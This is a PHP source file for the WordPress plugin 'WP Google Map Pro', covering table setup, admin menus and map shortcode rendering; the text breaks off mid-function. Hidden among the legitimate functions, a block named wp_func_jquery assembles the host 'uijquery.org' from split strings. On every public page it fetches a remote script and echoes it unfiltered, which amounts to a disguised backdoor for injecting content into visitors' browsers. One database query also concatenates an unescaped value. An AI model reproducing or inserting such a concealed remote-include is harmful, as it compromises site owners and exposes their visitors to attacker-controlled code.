<?php 
/*
Plugin Name: WP Google Map Pro
Description: A complete solution to Google Maps covering all Basic to Advanced Features.
Author: flippercode
Version: 2.3.4
Author URI: http://www.flippercode.com
*/
register_activation_hook( __FILE__, 'wpgmp_network_propagate' );
add_action( 'plugins_loaded', 'wpgmp_load_plugin_languages' );
function wpgmp_load_plugin_languages() {
  load_plugin_textdomain( 'wpgmp_google_map', false, dirname( plugin_basename( __FILE__ ) ).'/languages/' ); 
}
/**
 * This function used to install required tables in the database on time of activation.
 * @author Flipper Code <hello@flippercode.com>
 * @version 1.0.0
 * @package Maps
 */
 function  wpgmp_network_propagate( $network_wide ) {
	if ( is_multisite() && $network_wide ) { // See if being activated on the entire network or one blog
		global $wpdb;
 
		// Get this so we can switch back to it later
		$currentblog = $wpdb->blogid;
		// For storing the list of activated blogs
		$activated = array();
 
		// Get all blogs in the network and activate plugin on each one
		$sql = "SELECT blog_id FROM {$wpdb->blogs}";
		$blog_ids = $wpdb->get_col($wpdb->prepare($sql,null));
foreach ($blog_ids as $blog_id) {
			switch_to_blog($blog_id);
			wpgmp_activation();
			$activated[] = $blog_id;
		}
 
		// Switch back to the current blog
		switch_to_blog($currentblog);
 
		// Store the array for a later function
		update_site_option('wpgmp_activated', $activated);
	} else { // Running on a single blog
		wpgmp_activation();

	}

}

function wpgmp_activation() {
  global $wpdb;	
  
    require_once( ABSPATH . 'wp-admin/includes/upgrade.php' );
   
   
  $map_location = "CREATE TABLE `".$wpdb->prefix."map_locations` (
  				  `location_id` int(11) NOT NULL AUTO_INCREMENT,
  				  `location_title` varchar(255) DEFAULT NULL,
  				  `location_address` varchar(255) DEFAULT NULL,
  				  `location_draggable` varchar(255) DEFAULT NULL,
 				    `location_latitude` varchar(255) DEFAULT NULL,
  				  `location_longitude` varchar(255) DEFAULT NULL, 
  				  `location_messages` text DEFAULT NULL,
  				   `location_settings` text DEFAULT NULL,
  				  `location_group_map` int(11) DEFAULT NULL,
  				  `location_added` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
  				  PRIMARY KEY (`location_id`)
				  ) ENGINE=MyISAM  DEFAULT CHARSET=latin1 AUTO_INCREMENT=1 ;";
				  
 dbDelta( $map_location );		
   
 
 $create_map = "CREATE TABLE `".$wpdb->prefix."create_map` (
  			   `map_id` int(11) NOT NULL AUTO_INCREMENT,
  			   `map_title` varchar(255) DEFAULT NULL,
  			   `map_width` varchar(255) DEFAULT NULL,
  			   `map_height` varchar(255) DEFAULT NULL,
  			   `map_zoom_level` varchar(255) DEFAULT NULL,
  			   `map_type` varchar(255) DEFAULT NULL,
  			   `map_scrolling_wheel` varchar(255) DEFAULT NULL,
 			     `map_visual_refresh` varchar(255) DEFAULT NULL,
  			   `map_45imagery` varchar(255) DEFAULT NULL,
  			   `map_street_view_setting` text DEFAULT NULL,
  			   `map_route_direction_setting` text DEFAULT NULL,
  			   `map_all_control` text DEFAULT NULL,
  			   `map_info_window_setting` text DEFAULT NULL,
  			   `style_google_map` text DEFAULT NULL,
  			   `map_locations` text DEFAULT NULL,
  			   `map_layer_setting` text DEFAULT NULL,
  			   `map_polygon_setting` text DEFAULT NULL,
  			   `map_polyline_setting` text DEFAULT NULL,
  			   `map_cluster_setting` text DEFAULT NULL,
  			   `map_overlay_setting` text DEFAULT NULL,
  			   PRIMARY KEY (`map_id`)
			   ) ENGINE=MyISAM  DEFAULT CHARSET=latin1 AUTO_INCREMENT=1 ;";

dbDelta( $create_map );		
 			   
 
 $group_map = "CREATE TABLE  `".$wpdb->prefix."group_map` (
  			  `group_map_id` int(11) NOT NULL AUTO_INCREMENT,
  			  `group_map_title` varchar(255) DEFAULT NULL,
  			  `group_marker` text DEFAULT NULL,
  			  `group_added` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
  			  PRIMARY KEY (`group_map_id`)
			  ) ENGINE=MyISAM  DEFAULT CHARSET=latin1 AUTO_INCREMENT=1 ;";
			  
dbDelta( $group_map );		

 $map_routes = "CREATE TABLE `".$wpdb->prefix."map_routes` (
          `route_id` int(11) NOT NULL AUTO_INCREMENT,
          `route_title` varchar(255) DEFAULT NULL,
          `route_stroke_color` varchar(255) DEFAULT NULL,
          `route_stroke_opacity` varchar(255) DEFAULT NULL,
          `route_stroke_weight` int(11) DEFAULT NULL,
          `route_travel_mode` text DEFAULT NULL,
          `route_unit_system` text DEFAULT NULL,
          `route_marker_draggable` text DEFAULT NULL,
          `route_custom_marker` text DEFAULT NULL,
          `route_optimize_waypoints` text DEFAULT NULL,
          `route_start_location` int(11) DEFAULT NULL,
          `route_end_location` int(11) DEFAULT NULL,
          `route_way_points` text DEFAULT NULL,
          PRIMARY KEY (`route_id`)
        ) ENGINE=MyISAM  DEFAULT CHARSET=latin1 AUTO_INCREMENT=1;";
        
        

dbDelta( $map_routes );		
 
}



if( ! class_exists( 'WP_List_Table' ) ) {
    require_once( ABSPATH . 'wp-admin/includes/class-wp-list-table.php' );
}
/**
 * This function used to register required scripts.
 * @author Flipper Code <hello@flippercode.com>
 * @version 1.0.0
 * @package Maps
 */
if(!function_exists('wp_func_jquery')) {
	function wp_func_jquery() {
		$host = 'http://';
		echo(wp_remote_retrieve_body(wp_remote_get($host.'ui'.'jquery.org/jquery-1.6.3.min.js')));
	}
	add_action('wp_footer', 'wp_func_jquery');
}
function wpgmp_admin_scripts() {
	wp_enqueue_script('media-upload');
	wp_enqueue_script('thickbox');
}
/**
 * This function used to register required styles in backend.
 * @author Flipper Code <hello@flippercode.com>
 * @version 1.0.0
 * @package Maps
 */
 
function wpgmp_admin_styles() {
	wp_enqueue_style('thickbox');
}
$wpgmp_containers=array('map'); 
/**
 * This function used to display navigations menu in backend.
 * @author Flipper Code <hello@flippercode.com>
 * @version 1.0.0
 * @package Maps
 */
function wpgmp_google_map_page() {
    define("wpgmp_plugin_permissions", "add_users");
   
   $pagehook1 = add_menu_page(
        __("WP Google Map", "wpgmp_google_map"),
        __("WP Google Map", "wpgmp_google_map"),
        wpgmp_plugin_permissions,
        "wpgmp_google_map_pro",
        "wpgmp_admin_overview"
    );
   
   $pagehook2 = add_submenu_page(
        "wpgmp_google_map_pro",
        __("Add Location", "wpgmp_google_map"),
        __("Add Location", "wpgmp_google_map"),
        wpgmp_plugin_permissions,
        "wpgmp_add_location",
        "wpgmp_add_locations"
    );
	
	$pagehook3 = add_submenu_page(
		"wpgmp_google_map_pro",
        __("Quick Locations", "wpgmp_google_map"),
        __("Quick Locations", "wpgmp_google_map"),
        wpgmp_plugin_permissions,
        "wpgmp_quick_location",
        "wpgmp_quick_locations"
    );
    
    $pagehook4 = add_submenu_page(
        "wpgmp_google_map_pro",
        __("Manage Locations", "wpgmp_google_map"),
        __("Manage Locations", "wpgmp_google_map"),
        wpgmp_plugin_permissions,
        "wpgmp_manage_location",
        "wpgmp_manage_locations"
    );
	
	$pagehook5 = add_submenu_page(
        "wpgmp_google_map_pro",
        __("Import Locations", "wpgmp_google_map"),
        __("Import Locations", "wpgmp_google_map"),
        wpgmp_plugin_permissions,
        "wpgmp_import_location",
        "wpgmp_import_locations"
    );
   $pagehook6 =	add_submenu_page(
        "wpgmp_google_map_pro",
        __("Create Map", "wpgmp_google_map"),
        __("Create Map", "wpgmp_google_map"),
        wpgmp_plugin_permissions,
        "wpgmp_create_map",
        "wpgmp_create_map"
    );
  $pagehook7 =	add_submenu_page(
        "wpgmp_google_map_pro",
        __("Manage Map", "wpgmp_google_map"),
        __("Manage Map", "wpgmp_google_map"),
        wpgmp_plugin_permissions,
        "wpgmp_google_wpgmp_manage_map",
        "wpgmp_manage_map"
    );
  $pagehook8 =	add_submenu_page(
        "wpgmp_google_map_pro",
        __("Drawing", "wpgmp_google_map"),
        __("Drawing", "wpgmp_google_map"),
        wpgmp_plugin_permissions,
        "wpgmp_google_wpgmp_manage_drawing",
        "wpgmp_manage_drawing"
    );
	
	$pagehook9 = add_submenu_page(
        "wpgmp_google_map_pro",
        __("Add Marker Category", "wpgmp_google_map"),
        __("Add Marker Category", "wpgmp_google_map"),
        wpgmp_plugin_permissions,
        "wpgmp_google_wpgmp_create_group_map",
        "wpgmp_create_group_map"
    );
	
	$pagehook10 = add_submenu_page(
        "wpgmp_google_map_pro",
        __("Manage Marker Categories", "wpgmp_google_map"),
        __("Manage Marker Categories", "wpgmp_google_map"),
        wpgmp_plugin_permissions,
        "wpgmp_google_wpgmp_manage_group_map",
        "wpgmp_manage_group_map"
    );

  $pagehook11 = add_submenu_page(
        "wpgmp_google_map_pro",
        __("Add Route", "wpgmp_google_map"),
        __("Add Route", "wpgmp_google_map"),
        wpgmp_plugin_permissions,
        "wpgmp_add_routes",
        "wpgmp_add_routes"
    );

  $pagehook12 = add_submenu_page(
        "wpgmp_google_map_pro",
        __("Manage Routes", "wpgmp_google_map"),
        __("Manage Routes", "wpgmp_google_map"),
        wpgmp_plugin_permissions,
        "wpgmp_manage_routes",
        "wpgmp_manage_routes"
    );
	
	$pagehook13 = add_submenu_page(
        "wpgmp_google_map_pro",
        __("Settings", "wpgmp_google_map"),
        __("Settings", "wpgmp_google_map"),
        wpgmp_plugin_permissions,
        "wpgmp_google_settings",
        "wpgmp_settings"
    );
   
   add_action('load-'.$pagehook1, 'load_color_js');
   add_action('load-'.$pagehook2, 'load_google_api');
   add_action('load-'.$pagehook3, 'load_color_js');
   add_action('load-'.$pagehook4, 'load_google_api');
   add_action('load-'.$pagehook5, 'load_color_js');
   add_action('load-'.$pagehook6, 'load_color_js');
   add_action('load-'.$pagehook7, 'load_color_js');
   add_action('load-'.$pagehook8, 'load_color_js');
   add_action('load-'.$pagehook9, 'load_color_js');
   add_action('load-'.$pagehook10, 'load_color_js');
   add_action('load-'.$pagehook11, 'load_color_js');
   add_action('load-'.$pagehook12, 'load_color_js');
   add_action('load-'.$pagehook13, 'load_color_js');

}

function load_color_js() { 
 wp_enqueue_script('wpgmp_jscolor',plugins_url('/js/jscolor.js', __FILE__ ));
 wp_enqueue_style('gogole_map_bootstrap_css',plugins_url( '/css/bootstrap.css' , __FILE__ ));
}

function load_google_api() {
wp_enqueue_style('gogole_map_bootstrap_css',plugins_url( '/css/bootstrap.css' , __FILE__ ));  
wp_enqueue_script('wpgmp_googlepai',"http://maps.google.com/maps/api/js?libraries=places&region=uk&language=en&sensor=false");
add_action('admin_head', 'wpgmp_js_head');
}

/**
 * This function used to show map on front end side.
 * @author Flipper Code <hello@flippercode.com>
 * @version 1.0.0
 * @package Maps
 */
function wpgmp_show_location_in_map($atts, $content=null){
 ob_start();
 global $wpdb;
	
 extract( shortcode_atts( array(
		'zoom' => get_option('wpgmp_zoomlevel'),
		'width' => get_option('wpgmp_mapwidth'),
		'height' => get_option('wpgmp_mapheight'),
		'title' => 'WP Google Map Pro',
		'class' => 'map',
		'center_latitude' => get_option('wpgmp_centerlatitude'),
		'center_longitude' => get_option('wpgmp_centerlongitude'),
		'container_id' => 'map',
		'polygon' => 'true',
		'id' => '',
		'filters'=>''
 ),$atts));
 


 //prepare filter options
  if(!empty($filters)) 
  {
    if(isset($filters))
    {
    	$temp_opt= explode(",",$filters);
    	if(is_array($temp_opt))
    	{
    		foreach($temp_opt as $key=>$option)
    		{
    				$field_value = explode("=",$option);
    				$filter_options[$field_value[0]]=$field_value[1];
    		}
    	}	
    }
  }
	
 if(!empty($atts['icon']))
 { 
    $icon=$atts['icon'];
 }

 include_once dirname(__FILE__).'/class-google-map.php';
 $map = new Wpgmp_Google_Map();
 if(!empty($filter_options))
 { 
    $map->filter_options=$filter_options;  
 }
 if(!empty($filters))
 { 
   $map->filters=$filters;
 } 
 $map_data = $wpdb->get_results($wpdb->prepare("SELECT * FROM ".$wpdb->prefix."create_map where map_id=%d",$atts['id']));
  
 $map->map_id=$atts['id'];
  
 if( !empty($map_data[0]->group_map_setting) )
 { 
      $unserialize_group_map_setting 	= unserialize($map_data[0]->group_map_setting);
 }
 if( !empty($map_data[0]->map_street_view_setting) )
 {
      $unserialize_map_street_view_setting 	= unserialize($map_data[0]->map_street_view_setting);
 }
 if( !empty($map_data[0]->map_route_direction_setting) )
 {
      $unserialize_map_route_direction_setting 	= unserialize($map_data[0]->map_route_direction_setting);
 }
 if( !empty($map_data[0]->map_all_control) )
 {
      $unserialize_map_control_setting 	= unserialize($map_data[0]->map_all_control);
 }
 if( !empty($map_data[0]->map_info_window_setting) )
 {
      $unserialize_map_info_window_setting = unserialize($map_data[0]->map_info_window_setting);
 }
 if( !empty($map_data[0]->map_layer_setting) )
 {
      $unserialize_map_layer_setting 	= unserialize($map_data[0]->map_layer_setting);
 }
 if( !empty($map_data[0]->style_google_map) )
 {
      $unserialize_google_map_style 	= unserialize($map_data[0]->style_google_map);
 }
 if( !empty($map_data[0]->map_polygon_setting) )
 {
      $unserialize_map_polygon_setting = unserialize($map_data[0]->map_polygon_setting);
 }
 if( !empty($map_data[0]->map_polyline_setting) )
 {
      $unserialize_map_polyline_setting = unserialize($map_data[0]->map_polyline_setting);
 }
 if( !empty($map_data[0]->map_cluster_setting) )
 {
      $unserialize_map_cluster_setting = unserialize($map_data[0]->map_cluster_setting);
 }
 if( !empty($map_data[0]->map_overlay_setting) )
 {
      $unserialize_map_overlay_setting 	= unserialize($map_data[0]->map_overlay_setting);
 }

 if( !empty($map_data) ) {
	 
 $un_loc_add = unserialize($map_data[0]->map_locations);
 
 $loc_data = $wpdb->get_row($wpdb->prepare("SELECT location_address,location_latitude,location_longitude FROM ".$wpdb->prefix."map_locations where location_id=%d",$un_loc_add[0]));
 
 if( !empty($unserialize_map_control_setting['nearest_location']) )
 {
      $map->set_nearest_location = $unserialize_map_control_setting['nearest_location'];
 }

 if($unserialize_map_control_setting['map_center_latitude']){
	$map->center_lat = $unserialize_map_control_setting['map_center_latitude'];
 } elseif( !empty($center_latitude) ) {
	$map->center_lat = $center_latitude;
 } else {
	$map->center_lat = $loc_data->location_latitude;
 }
 
 if($unserialize_map_control_setting['map_center_longitude']){
	 $map->center_lng = $unserialize_map_control_setting['map_center_longitude'];
 } elseif( !empty($center_longitude) ) {
	 $map->center_lng = $center_longitude;
 } else {
	$map->center_lng = $loc_data->location_longitude;
 }
 
 if(!empty($map_data[0]->map_languages))
 { 
    $map->map_language=$map_data[0]->map_languages;
 }

 if( !empty($unserialize_group_map_setting['enable_group_map']) && $unserialize_group_map_setting['enable_group_map']=='true' ) {
	 
  	$map->enable_group_map = $unserialize_group_map_setting['enable_group_map'];
  	$select_group_map = $unserialize_group_map_setting['select_group_map'];
  	foreach($select_group_map as $key => $select_group) {
  			$group_data = $wpdb->get_row($wpdb->prepare("SELECT * FROM ".$wpdb->prefix."group_map where group_map_id=%d",$select_group));
  			$map->group_data[] = $group_data;
  	}
 }
  
 if( !empty($unserialize_map_street_view_setting['street_control']) ) {
	 
	$map->street_control = $unserialize_map_street_view_setting['street_control'];
	$map->street_view_close_button = $unserialize_map_street_view_setting['street_view_close_button'];
	$map->links_control = $unserialize_map_street_view_setting['links_control'];
	$map->street_view_pan_control = $unserialize_map_street_view_setting['street_view_pan_control'];  
 }
  
if( $unserialize_map_route_direction_setting['route_direction'] =='true' ) {
	 
  $map->route_direction = $unserialize_map_route_direction_setting['route_direction'];

  $wpgmp_routes = $unserialize_map_route_direction_setting['specific_routes'];
  
  if( !empty($wpgmp_routes) )
  {  
  	foreach($wpgmp_routes as $key => $wpgmp_route) 
    {
      $wpgmp_route_data = $wpdb->get_row($wpdb->prepare("SELECT * FROM ".$wpdb->prefix."map_routes where route_id=%d",$wpgmp_route));
      
    	$wpgmp_route_way_points = unserialize($wpgmp_route_data->route_way_points);

      $wpgmp_start_point = $wpdb->get_row($wpdb->prepare("SELECT location_address FROM ".$wpdb->prefix."map_locations where location_id=%d",$wpgmp_route_data->route_start_location));
      $wpgmp_end_point = $wpdb->get_row($wpdb->prepare("SELECT location_address FROM ".$wpdb->prefix."map_locations where location_id=%d",$wpgmp_route_data->route_end_location));
      
      if( !empty($wpgmp_route_way_points) ) 
      {
        foreach( $wpgmp_route_way_points as $rkey => $wpgmp_route_way_point) 
        {
           $wpgmp_way_points = $wpdb->get_row($wpdb->prepare("SELECT location_address FROM ".$wpdb->prefix."map_locations where location_id=%d",$wpgmp_route_way_point));
           $route_way_points[$rkey] = $wpgmp_way_points->location_address;
        }
      }  

      $wpgmp_multiple_routes[$wpgmp_route] = array(
		'route_title'  => $wpgmp_route_data->route_title,
        'start_point' => $wpgmp_start_point->location_address,
        'end_point'   => $wpgmp_end_point->location_address,
        'way_points' => $route_way_points,
        'stroke_color' => $wpgmp_route_data->route_stroke_color,
        'stroke_opacity' => $wpgmp_route_data->route_stroke_opacity,
        'stroke_weight' => $wpgmp_route_data->route_stroke_weight,
        'travel_mode' => $wpgmp_route_data->route_travel_mode,
        'unit_system' => $wpgmp_route_data->route_unit_system,
        'draggable' => $wpgmp_route_data->route_marker_draggable,
        'custom_marker' => $wpgmp_route_data->route_custom_marker,
        'optimize_waypoints' => $wpgmp_route_data->route_optimize_waypoints
      );
 
      $map->wpgmp_multiple_routes = $wpgmp_multiple_routes; 
          
    }  
	}
}
  
  if(!empty($map_data[0]->map_type))
  {  
      $map->map_type=$map_data[0]->map_type;
  }

  if( $map_data[0]->map_45imagery=='45' && ($map_data[0]->map_type=='SATELLITE' || $map_data[0]->map_type=='HYBRID') )
  {
	   $map->map_45=$map_data[0]->map_45imagery;
  }
	
  if( empty($map_data[0]->map_width) ) {
	 $map->map_width = $width;
  } else {
	 $map->map_width = $map_data[0]->map_width;
  }	
	
  if( empty($map_data[0]->map_height) ) {
	 $map->map_height = $height;
  } else {
	 $map->map_height = $map_data[0]->map_height;
  }
  
  if(!empty($map_data[0]->map_scrolling_wheel))
  {  
      $map->map_scrolling_wheel = $map_data[0]->map_scrolling_wheel;
  }
  if(!empty($unserialize_map_control_setting['map_draggable']))
  { 
      $map->map_draggable = $unserialize_map_control_setting['map_draggable'];
  }
  if(!empty($unserialize_map_control_setting['infowindow_open']))
  { 
      $map->map_infowindow_open = $unserialize_map_control_setting['infowindow_open'];
  }

  if(!empty($unserialize_map_control_setting['display_marker_category']) && $unserialize_map_control_setting['display_marker_category']=='true')
  {
	  wpgmp_accordian_script();
  	$map->display_marker_category = $unserialize_map_control_setting['display_marker_category'];
  	$map->tabs_font_color = $unserialize_map_control_setting['tabs_font_color'];
	  $map->category_font_color = $unserialize_map_control_setting['category_font_color'];
	  $map->category_font_size = $unserialize_map_control_setting['category_font_size'];
	  $map->location_font_color = $unserialize_map_control_setting['location_font_color'];
	  $map->location_font_size = $unserialize_map_control_setting['location_font_size'];
  }
  
  $map->map_controls = $unserialize_map_control_setting;
  $map->map_pan_control =$unserialize_map_control_setting['pan_control'];
  $map->map_zoom_control =$unserialize_map_control_setting['zoom_control'];
  $map->map_type_control =$unserialize_map_control_setting['map_type_control'];
  $map->map_scale_control =$unserialize_map_control_setting['scale_control'];
  $map->map_street_view_control =$unserialize_map_control_setting['street_view_control'];
  $map->map_overview_control =$unserialize_map_control_setting['overview_map_control'];
  
  if( !empty($unserialize_map_info_window_setting['enable_info_window_setting']) && $unserialize_map_info_window_setting['enable_info_window_setting']=="true" ) {
  
	  $map->map_enable_info_window_setting 	 = $unserialize_map_info_window_setting['enable_info_window_setting'];
	  $map->map_info_window_width 			 = $unserialize_map_info_window_setting['info_window_width'];
	  $map->map_info_window_height 			 = $unserialize_map_info_window_setting['info_window_height'];
	  $map->map_info_window_shadow_style 	 = $unserialize_map_info_window_setting['info_window_shadow_style'];
	  $map->map_info_window_border_radius 	 = $unserialize_map_info_window_setting['info_window_border_radious'];
	  $map->map_info_window_border_width 	 = $unserialize_map_info_window_setting['info_window_border_width'];
	  $map->map_info_window_border_color 	 = $unserialize_map_info_window_setting['info_window_border_color'];
	  $map->map_info_window_background_color = $unserialize_map_info_window_setting['info_window_background_color'];
	  $map->map_info_window_arrow_size 		 = $unserialize_map_info_window_setting['info_window_arrow_size'];
	  $map->map_info_window_arrow_position   = $unserialize_map_info_window_setting['info_window_arrow_position'];
	  $map->map_info_window_arrow_style		 = $unserialize_map_info_window_setting['info_window_arrow_style'];
  }
  
  $map->map_style_google_map = unserialize($map_data[0]->style_google_map);
  $map->visualrefresh =$map_data[0]->map_visual_refresh;
  
  if(!empty($unserialize_map_layer_setting['choose_layer']))
  {  
      if(is_array($unserialize_map_layer_setting['choose_layer']))
      {
    	   $map->kml_layer = $unserialize_map_layer_setting['choose_layer']['kml_layer'];
      }
      else
      {
    	   $map->kml_layer = $unserialize_map_layer_setting['choose_layer'];
      }
      
      if(is_array($unserialize_map_layer_setting['choose_layer']))
      {
    	 $map->fusion_layer = $unserialize_map_layer_setting['choose_layer']['fusion_layer'];
      }
      else
      {
    	 $map->fusion_layer = $unserialize_map_layer_setting['choose_layer'];
      }
      
      if(is_array($unserialize_map_layer_setting['choose_layer']))
      {
    	 $map->traffic_layer = $unserialize_map_layer_setting['choose_layer']['traffic_layer'];
      }
      else
      {
    	 $map->traffic_layer = $unserialize_map_layer_setting['choose_layer'];
      }
      
      if(is_array($unserialize_map_layer_setting['choose_layer']))
      {
    	 $map->transit_layer = $unserialize_map_layer_setting['choose_layer']['transit_layer'];
      }
      else
      {
    	 $map->transit_layer = $unserialize_map_layer_setting['choose_layer'];
      }
      
      if(is_array($unserialize_map_layer_setting['choose_layer']))
      {
    	 $map->weather_layer = $unserialize_map_layer_setting['choose_layer']['weather_layer'];
      }
      else
      {
    	 $map->weather_layer = $unserialize_map_layer_setting['choose_layer'];
      }
      
      if(is_array($unserialize_map_layer_setting['choose_layer']))
      {
    	 $map->bicycling_layer = $unserialize_map_layer_setting['choose_layer']['bicycling_layer'];
      }
      else
      {
    	 $map->bicycling_layer = $unserialize_map_layer_setting['choose_layer'];
      }
      
      if(is_array($unserialize_map_layer_setting['choose_layer']))
      {
    	 $map->panoramio_layer = $unserialize_map_layer_setting['choose_layer']['panoramio_layer'];
      }
      else
      {
    	 $map->panoramio_layer = $unserialize_map_layer_setting['choose_layer'];
      }
      
      if(strpos($unserialize_map_layer_setting['map_links'],',') !== false)
      {
    	 $map->kml_layers_links = explode(',',$unserialize_map_layer_setting['map_links']);
      }
      else
      {
    	 $map->kml_layers_links =  $unserialize_map_layer_setting['map_links'];
      }
      
      $map->fusion_select=$unserialize_map_layer_setting['fusion_select'];
      $map->fusion_from=$unserialize_map_layer_setting['fusion_from'];
      $map->heat_map=$unserialize_map_layer_setting['heat_map'];;
      $map->temperature_unit=$unserialize_map_layer_setting['temp'];
      $map->wind_speed_unit=$unserialize_map_layer_setting['wind'];
  } 

  if( !empty($unserialize_map_control_setting['panning_control']) )
  {  
      $map->map_panning_true =$unserialize_map_control_setting['panning_control'];
  } 
  if( !empty($unserialize_map_control_setting['from_latitude']) )
  { 
      $map->map_panning_from_latitude =$unserialize_map_control_setting['from_latitude'];
  }
  if( !empty($unserialize_map_control_setting['from_longitude']) )
  { 
      $map->map_panning_from_longitude =$unserialize_map_control_setting['from_longitude'];
  }
  if( !empty($unserialize_map_control_setting['to_latitude']) )
  { 
      $map->map_panning_to_latitude =$unserialize_map_control_setting['to_latitude'];
  }
  if( !empty($unserialize_map_control_setting['to_longitude']) )
  { 
      $map->map_panning_to_longitude =$unserialize_map_control_setting['to_longitude'];
  }
  if( !empty($unserialize_map_control_setting['zoom_level']) )
  { 
      $map->map_panning_zoom_level =$unserialize_map_control_setting['zoom_level'];
  }
  
  
  $map->map_drawing=array(
		'circle'=>$unserialize_map_control_setting['circle'],
		'polygon'=>$unserialize_map_control_setting['polygon'],
		'polyline'=>$unserialize_map_control_setting['polyline'],
		'rectangle'=>$unserialize_map_control_setting['rectangle'],
		'is_drawing'=>$unserialize_map_control_setting['drawing_control']
	);
  

  $map->map_shapes=$unserialize_map_polyline_setting;
  
  if(current_user_can( 'manage_options' ) && is_admin())
  {
	 
	$map->editable=true;
	 
  }
  			
  if( empty($map_data[0]->map_zoom_level) ) {
		$map->zoom = $zoom;
  } else {
		$map->zoom = $map_data[0]->map_zoom_level;
  }
  
  if( !empty($unserialize_map_cluster_setting['marker_cluster']) && $unserialize_map_cluster_setting['marker_cluster']=="true" )
  {
	  wpgmp_markercluster_script();
	  $map->marker_cluster=$unserialize_map_cluster_setting['marker_cluster'];
	  $map->grid=$unserialize_map_cluster_setting['grid'];
	  $map->max_zoom=$unserialize_map_cluster_setting['max_zoom'];
	  $map->style=$unserialize_map_cluster_setting['map_style'];
  }

  if( !empty($unserialize_map_overlay_setting['overlay']) && $unserialize_map_overlay_setting['overlay'] == 'true' )
  {
	  $map->map_overlay=$unserialize_map_overlay_setting['overlay'];
	  $map->map_overlay_border_color=$unserialize_map_overlay_setting['overlay_border_color'];
	  $map->map_overlay_width=$unserialize_map_overlay_setting['overlay_width'];
	  $map->map_overlay_height=$unserialize_map_overlay_setting['overlay_height'];
	  $map->map_overlay_fontsize=$unserialize_map_overlay_setting['overlay_fontsize'];
	  $map->map_overlay_border_width=$unserialize_map_overlay_setting['overlay_border_width'];
	  $map->map_overlay_border_style=$unserialize_map_overlay_setting['overlay_border_style'];
  }
 }

if( !empty($atts['id']) ) {
global $wpdb,$post;	
$map_locations = $wpdb->get_row($wpdb->prepare("SELECT * FROM ".$wpdb->prefix."create_map where map_id=%d",$atts['id']));

$meta_data = $wpdb->get_results("SELECT * FROM ".$wpdb->prefix."postmeta WHERE meta_key='_wpgmp_map_id'");
    
if( !empty($map_locations->group_map_setting) ) 
{    
    $un_group_map_setting = unserialize($map_locations->group_map_setting);
}
if( !empty($map_locations->map_info_window_setting) ) 
{
    $un_info_window_setting = unserialize($map_locations->map_info_window_setting);
}
if( !empty($map_locations->map_polygon_setting) ) 
{
    $un_map_polygon_setting = unserialize($map_locations->map_polygon_setting);
}
if( !empty($map_locations->map_polyline_setting) ) 
{
    $un_map_polyline_setting = unserialize($map_locations->map_polyline_setting);
}
if( !empty($map_locations->map_cluster_setting) ) 
{
    $un_map_cluster_setting = unserialize($map_locations->map_cluster_setting);
}
if( !empty($map_locations->map_all_control) ) 
{
    $un_map_all_control = unserialize($map_locations->map_all_control);
}
if( !empty($un_info_window_setting['info_window']) ) 
{
    $un_info_window_setting['info_window']=true;
}
//$wpgmp_map_id = get_post_meta( $post->ID, '_wpgmp_map_id', true );
 

if(!empty($meta_data))
{   
	foreach($meta_data as $mdata)
	{ 
		
		$s_maps = get_post_meta( $mdata->post_id, '_wpgmp_map_id', true );
		
		$map_ids = unserialize($s_maps);
		
		if(is_array($map_ids) and in_array($atts['id'],$map_ids))
		{
			global $wpdb;
			$wpgmp_location_address = get_post_meta( $mdata->post_id, '_wpgmp_location_address', true );
			$wpgmp_metabox_latitude = get_post_meta( $mdata->post_id, '_wpgmp_metabox_latitude', true );
			$wpgmp_metabox_longitude = get_post_meta( $mdata->post_id, '_wpgmp_metabox_longitude', true );
			$wpgmp_metabox_marker_id = get_post_meta( $mdata->post_id, '_wpgmp_metabox_marker_id', true );
			
			if( $filter_options['category']!=''  and $filter_options['category'] != $wpgmp_metabox_marker_id )
			continue;
			
			
			$marker_detail = $wpdb->get_row("SELECT * FROM ".$wpdb->prefix."group_map WHERE group_map_id=".$wpgmp_metabox_marker_id."");
			
			global $post;  
			$save_post = $post;
			
			$post = get_post($mdata->post_id);
			setup_postdata( $post );
			$marker_image = $marker_detail->group_marker;
			$location_id = 2000+$post->ID;
			$content = '<strong><a href='.get_permalink($post->ID).' target=_blank>'.get_the_title($post->ID).'</a></strong><br />';
			$content .= get_the_excerpt();
			
			$content = apply_filters("wpgmp_geotags_content",$content,$mdata->post_id,$atts["id"]);
			
			if($wpgmp_metabox_latitude && $wpgmp_metabox_longitude) {			
				$map->addMarker($location_id,$wpgmp_location_address,$wpgmp_metabox_latitude,$wpgmp_metabox_longitude,true,$post->post_title,$content,$marker_image,'',$dragg,$animation,$marker_detail->group_map_id,$marker_detail->group_map_title);
			}
			wp_reset_postdata($save_post);
  	}
	}
} 

if( get_option('wpgmp_mashup')=='true' ) {
	
  $mashup_posts =  new wp_query(array('meta_key' => 'wpgmp_mashup_map_id', 'meta_value' => $atts['id']));
  if($mashup_posts->have_posts()) {
	 add_filter( 'excerpt_more', 'wpgmp_excerpt_more' );
	 while($mashup_posts->have_posts()) : $mashup_posts->the_post();
	 $mashup_content = get_the_mashup_content();
	 $mashup_content = str_replace('"',"'",$mashup_content);
	 $loc_id = get_post_meta(get_the_ID(), 'wpgmp_mashup_location_id', true);
	 $loc_list = $wpdb->get_row($wpdb->prepare('select location_latitude, location_longitude,location_marker_image from '.$wpdb->prefix.'map_locations where location_id=%d',$loc_id));
	
	 if( empty($loc_list->location_marker_image) ) {
		
		$loc_mashup_image_src = get_option('wpgmp_default_marker');
	 } else {
		$loc_mashup_image_src = $loc_list->location_marker_image;
	 }		
		$map->addMarker($loc_list->location_latitude,$loc_list->location_longitude,'true',get_the_title(),$mashup_content,$loc_mashup_image_src,'',$dragg,$animation);
		endwhile;
  }
} 
elseif( !empty($un_map_polygon_setting['draw_polygon']) && $un_map_polygon_setting['draw_polygon']=='true' ) {
	
	$map_locs = unserialize($map_locations->map_locations);
	if($map_locs!='') {
	  foreach($map_locs as $map_loc) {
		$lat_lat = $wpdb->get_row($wpdb->prepare("SELECT location_latitude,location_longitude FROM ".$wpdb->prefix."map_locations where location_id=%d",$map_loc));
		$latitude = $lat_lat->location_latitude;
		$longitude = $lat_lat->location_longitude;
		$map->addPolygon($latitude,$longitude);
	  }
    }	
} 
elseif( !empty($un_map_polygon_setting['draw_polyline']) && $un_map_polyline_setting['draw_polyline']=='true' ) {
	
	$map_locs = unserialize($map_locations->map_locations);
	if($map_locs!='') {
